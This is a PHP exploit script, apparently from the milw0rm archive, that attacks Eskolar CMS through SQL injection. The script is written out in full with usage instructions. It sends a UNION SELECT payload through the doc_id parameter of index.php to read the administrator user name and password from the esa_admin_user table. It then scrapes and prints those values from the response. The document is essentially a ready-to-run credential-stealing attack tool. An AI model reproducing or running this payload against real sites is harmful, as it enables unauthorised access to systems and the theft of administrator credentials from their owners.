#!/usr/bin/php -q -d short_open_tag=on
<?
/*
/* Eskolar CMS Remote sql injection exploit
/*            By : HACKERS PAL
/*             WwW.SoQoR.NeT
*/
print_r('
/**********************************************/
/* Eskolar CMS Remote sql injection exploit   */
/*     by HACKERS PAL <security@soqor.net>    */
/*         site: http://www.soqor.net         */');

if ($argc<2) {
	print_r('
/* --                                         */
/* Usage: php '.$argv[0].' host
/* Example:                                   */
/*    php '.$argv[0].' http://localhost/eskolar/
/**********************************************/
');
	die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

$url=$argv[1];
$exploit="/index.php?gr_1_id=0&gr_2_id=0&gr_3_id=1&doc_id=10%20union%20select%201,2,3,4,5,6,7,8,password,10,11,12,13,14,15,16,user,18,19,20,21,22,23,24,25,26%20FROM%20esa_admin_user/*";
$page=$url.$exploit;

Function get_page($url)
{
	if(function_exists("file_get_contents"))
	{
		$contents = file_get_contents($url);
	}
	else
	{
		$fp=fopen("$url","r");
		while($line=fread($fp,1024))
		{
			$contents=$contents.$line;
		}
	}
	return $contents;
}

$i=0;

function get($var)
{
	GLOBAL $i;
	$var[1]=trim($var[1]);
	if($i==0)
	{
		Echo "\n[+] User Name : ".$var[1];
		$i++;
	}
	else
	{
		Echo "\n[+] Pass Word : ".$var[1];
	}
}

$page = get_page($page);

if(!preg_match('/\<tr bgcolor=\'#FF0000\'><td><div align=\'center\'>(.+?)<\/div><\/td><\/tr>/is',$page)||!preg_match('/\<td><a href=\"(.+?)\" target=\"_blank\">(.+?)<\/a> <\/td>/is',$page))
{
	Die("\n[-] Exploit Failed\n/* Visit us : WwW.SoQoR.NeT                   */\n/**********************************************/");
}

preg_replace_callback('/\<tr bgcolor=\'#FF0000\'><td><div align=\'center\'>(.+?)<\/div><\/td><\/tr>/is','get',$page);
preg_replace_callback('/\<td><a href=\"(.+?)\" target=\"_blank\">(.+?)<\/a> <\/td>/is','get',$page);
Die("\n/*       Visit us : WwW.SoQoR.NeT             */\n/**********************************************/");
?>

# milw0rm.com [2006-09-22]
